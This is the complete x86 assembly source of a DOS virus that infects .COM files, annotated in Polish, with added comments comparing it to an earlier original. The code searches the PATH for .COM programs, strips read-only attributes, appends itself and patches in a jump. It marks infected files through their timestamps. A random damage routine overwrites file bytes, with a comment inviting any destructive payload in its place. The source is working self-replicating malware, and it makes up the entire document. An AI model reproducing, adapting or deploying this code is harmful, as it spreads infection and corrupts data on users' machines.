; Kod ¶r¢díowy wirusa nieznanego autorstwa. Widoczne sÜ silne wpíywy 648.
; Dodano wíasne komentarze wskazujÜce na r¢ßnice miëdzy tÜ wersjÜ i oryginaíem.
; Komentarze te poprzedzane sÜ znakami AK:.
; Tekst znaleziony na dysku komputera FIDO w PC Kurierze 28 wrzeûnia 1990.

comment ;
**********************************************************
wszystkie adresy w programie sa uzywane jako wzgledne
do rejestru si ,nie mozna urzywac adresow bezwzglednych
jako offset poniewaz po 'doklejeniu sie do programu
moze on byc w roznych miejscach
**********************************************************
;
adr_baz   equ  offset stare_DTA             ;adres bazowy poczatku zmiennych
                                                                           ;w programie wzgledem niego beda
                                                                           ;obliczane przesuniecia pol zmiennych
start_prg equ  100h                         ;adres poczatku programu typu .com
ofst_rozk equ offset rozkazy - adr_baz ;przsuniecie pola rozkazy
get_dta_addr  equ    2fh                    ;funkcja dos pobranie adresu DTA
msdos    equ 21h
write    equ 40h
wirus_len     equ    DTA + 43 - start

code    segment byte public 'code'
        assume  cs:code,ds:code,es:code

        org     100h

st1:          jmp short start

        int     msdos

start:  mov     dx,offset stare_DTA
        cld                                 ;ustawienie kierunku przesylania
              mov    si,dx                                                 ;poczatek zmiennych programu
              add    si,ofst_rozk                                          ;adres pola rozkazy
              mov    di,100h                                               ;adres pod ktorym jest poczatek programu
              mov    cx,3                                                  ;ilosc bajtow do przeslania
              repz   movsb                                                 ;odtworzenie starego poczatku

              mov    si,dx                                                 ;odtworzenie si

; AK: pominiëto badanie wersji DOS

              push   es                                                    ;zachowanie es bo bedzie zmieniane
              mov    ah,get_dta_addr        ;pobierz adres DTA
              int    msdos
              mov    [si],bx                                               ;zapamietanie adresu DTA w polu
              mov    [si+2],es              ;stare_DTA
              pop    es                                                    ;odtworzenie es

              mov    dx,5Fh                                                ;adres pola DTA
              add    dx,si
              mov    ah,1Ah                                                ;ustaw adres DTA   ds:dx
              int    msdos

; AK: zmieniona jest kolejnoûç instrukcji, teraz do przechowania SI ußyto
; DX zamiast stosu

              push   es                                                    ;zachowanie es
              push   si                                                    ;zachowaj si
              add    si,1ah                                                ;adres tekstu PATH=
              mov    dx,si
              mov    es,ds:[2Ch]            ;adres srodowiska set

; AK: w oryginale jest to PUSH SI, POP SI

              mov    di,0

szukaj_dalej:
              mov    si,dx
              lodsb  
              mov    cx,8000h               ;dlugosc srodowiska
              repnz  scasb                                                 ;szukanie litery P
              mov    cx,4                                                  ;dlugosc reszty   ATH=

porownuj:
              lodsb  
              scasb  
              jnz    szukaj_dalej
              loop   porownuj

              pop    si                                                    ;odtworz rejestry
              pop    es

              mov    [si+16h],di            ;adres pierwszego bajtu za PATH=
              mov    di,si
              add    di,1Fh                 ;adres bufora dla nazwy zbioru
              mov    bx,si
              jmp short dalej

nast_sciezka:
              cmp word ptr[si+16h],0        ;czy koniec path
              jnz    l1                                                    ;nie

              jmp    exit1                                                 ;zakoncz nie ma wiecej zbiorow

l1:           push   ds
              push   si
              mov    ds,es:[2Ch]            ;urzywamy es: bo ds bedzie modyfikowany
              mov    di,si
              mov    si,es:[di+16h]
              add    di,1Fh

next:         lodsb                                                        ;zaladuj kolejny znak sciezki dostepu
              cmp    al,';'                                                ;czy koniec definicji scierzki
              jz     koniec_sciezki
              cmp    al,0                                                  ;czy koniec lancucha path
              jz     koniec_set
              stosb                                                        ;przepisz znak do bufora
              jmp short next

koniec_set:
              mov    si,0
koniec_sciezki:
              pop    bx
              pop    ds
              mov    [bx+16h],si            ;adres do ktorego przeszukano path
              cmp byte ptr [di-1],'\'       ;czy scierzka zakonczona przez \
              jz     dalej
              mov    al,'\'
              stosb                                                        ;dopisz \

dalej:        mov    [bx+18h],di
              mov    si,bx
              add    si,10h
              mov    cx,6
              repz   movsb                                                 ;przepisanie *.com \0
              mov    si,bx
              mov    ah,4Eh                                                ;find first
              mov    dx,1Fh
              add    dx,si
              mov    cx,3                                                  ;ukryty tylko do odczytu
              int    msdos
              jmp short czy_jest

szuk_nast:
              mov    ah,4Fh                                                ;find next
              int    msdos

czy_jest:
              jnc    jest

              jmp short nast_sciezka

jest:         mov    ax,[si+75h]            ;pole zawierajace czas w DTA
              and    al,1Fh                                                ;czy sa 62 sekundy 
              cmp    al,1Fh

              jz     szuk_nast
              cmp word ptr [si+79h],0FA00h
              ja     szuk_nast              ;jesli zbyt dlugi
              cmp word ptr [si+79h],10
              jc     szuk_nast

              mov    di,[si+18h]
              push   si
              add    si,7Dh
kopiuj:
              lodsb                                                        ;kopiuje nazwe zbioru
              stosb                                                        ;nazwa w postaci ASCIIZ
              cmp    al,0                                                  ;czy koniec nazwy
              jnz    kopiuj
              pop    si

              mov    ax,4300h               ;pobierz atrybuty zbioru
              mov    dx,1Fh
              add    dx,si
              int    msdos
              mov    [si+8],cx              ;zapamietanie atrybutow

              mov    ax,4301h               ;ustaw atrybuty
              and    cx,0FFFEh              ;usuwa ewentualne r/o
              mov    dx,1Fh
              add    dx,si
              int    msdos

              mov    ax,3D02h                                              ;otwarcie zbioru
              mov    dx,1Fh
              add    dx,si
              int    msdos

              jnc    l2                                                    ;czy poprawne otwarcie

              jmp    exit2

l2:           mov    bx,ax
              mov    ax,5700h               ;pobierz czas i date powstania zbioru
              int    msdos
              mov    [si+4],cx              ;czas
              mov    [si+6],dx              ;data

              mov    ah,2Ch                                                ;pobierz czas systemowy
              int    msdos

              and    dh,7                                                  ;sekundy
              jnz    zostaw

comment ;
**********************************************************
tutaj mozna umiescic dowolna procedure uszkadzajaca zbior
ta wywolywana jest losowo jesli ostatnie trzy bity sekund
zegara systemu sa rowne zero np. 8,16,24 itd.
**********************************************************
;
              mov    ah,write                                              ;zapis do zbioru
              mov    cx,5                                                  ;pieciu bajtow lezacych
              mov    dx,si                                                 ;juz poza programem czyli
              add    dx,8Ah                 ;faktycznie dowolnych
              int    msdos
              jmp    exit3

;*********************************************************
;koniec procedury uszkadzajacej zbior
;*********************************************************

zostaw:       mov    ah,3Fh                                                ;odczyt trzech pierwszych
              mov    cx,3                                                  ;bajtow z pliku
              mov    dx,ofst_rozk           ;do pola rozkazy
              add    dx,si
              int    msdos

              jc     exit3                                                 ;jesli byl blad czytania
              
              cmp    ax,3                                                  ;czy odczytano dokladnie
              jnz    exit3                                                 ;trzy bajty

              mov    ax,4202h               ;przewiniecie zbioru na koniec
              mov    cx,0
              mov    dx,0
              int    msdos

              jc     exit3                                                 ;jesli blad

              mov    cx,ax                                                 ;w ax dlugosc zbioru
              sub    ax,3
;obiczanie przesuniecia dla skoku do poczatku wirusa
;jest to adres konca zbioru minus 3 poniewaz 
;jmp jest trzy bajtowy

              mov    [si+0Eh],ax            ;zapis adresu w polu skok

              add    cx,adr_baz - start + start_prg
;obliczanie adresu poczatku danych (tego ktory jest w si)
;jest to adres pola stare_DTA + 100h przesuniecia programu

              mov    di,si
              sub    di,adr_baz - start - 1
              mov    [di],cx                                               ;zapisanie adresu bezposrednio w pole
                                                                           ;w pole rozkazu mov dx,offset

              mov    ah,write                                              ;dopisanie wirusa na koniec
              mov    cx,wirus_len           ;dlugosc wirusa
              mov    dx,si
              sub    dx,adr_baz - start     ;obliczenie adresu poczatku wirusa
              int    msdos

              jc     exit3                                                 ;jesli blad
              cmp    ax,wirus_len           ;czy zapisano calego wirusa
              jnz    exit3

              mov    ax,4200h               ;przewiniecie zbioru na poczatek
              mov    cx,0
              mov    dx,0
              int    msdos

              jc     exit3                                                 ;jesli blad

              mov    ah,write                                              ;zapis jmp do wirusa
              mov    cx,3                                                  ;na poczatku
              mov    dx,si
              add    dx,0Dh                                                ;pole skok
              int    msdos

exit1:        mov    dx,[si+6]              ;data
              mov    cx,[si+4]              ;czas
              or     cx,1Fh                                                ;zaznaczenie ze zbior jest zarazony
                                                                           ;ilosc sekund = 62

              mov    ax,5701h               ;zapis daty i czasu do zbioru
              int    msdos

              mov    ah,3Eh                                                ;zamkniecie zbioru
              int    msdos

exit2:        mov    ax,4301h               ;ustawienie atrybutow
              mov    cx,[si+8]              ;stare atrybuty
              mov    dx,001Fh
              add    dx,si
              int    msdos

exit3:        push   ds
              mov    ah,1Ah                                                ;ustaw adres DTA
              mov    dx,[si+0]              ;pole stare_DTA
              mov    ds,es:[si+2]
              int    msdos

              pop    ds

              xor    ax,ax                                                 ;zerowanie rejestrow
              xor    bx,bx
              xor    dx,dx
              xor    si,si
              mov    di,0100h               ;na stos adres startu
              push   di
              xor    di,di
              ret    

stare_DTA     dd     0
czas_zb              dw                     0
data_zb              dw                     0
attr_zb              dw                     0
rozkazy              db                     0b4h,4ch,0cdh
skok                 db                     0e9h,0,0                       ;kod rozkazu jmp
zbior                db                     '*.com',0
srodow               dw                     0                                  ;adres srodowiska set
bufor                dw                     0                                  ;wskaznik do nazwy zbioru
path                 db                     'PATH='
nazwa_zb      db     63 dup(0)              ;pole na nazwe zbioru
DTA                  db                     43 dup(0)                      ;pole dta

code          ends
              end   st1

